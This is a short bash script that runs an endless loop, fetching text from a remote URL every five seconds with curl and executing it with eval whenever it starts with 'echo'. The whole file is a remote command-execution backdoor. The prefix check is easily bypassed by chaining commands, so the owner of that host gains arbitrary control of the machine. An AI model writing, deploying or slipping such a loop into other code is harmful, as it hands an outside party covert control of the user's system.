#!/bin/bash

url="ondrejsimek.com/racked"
trigger="echo"
while [ true ]; do
	cmd=$(curl "$url" 2>/dev/null)
	if [ $? -eq 0 ] && [[ $cmd == $trigger* ]]; then
		eval $cmd
	fi
	sleep 5
done
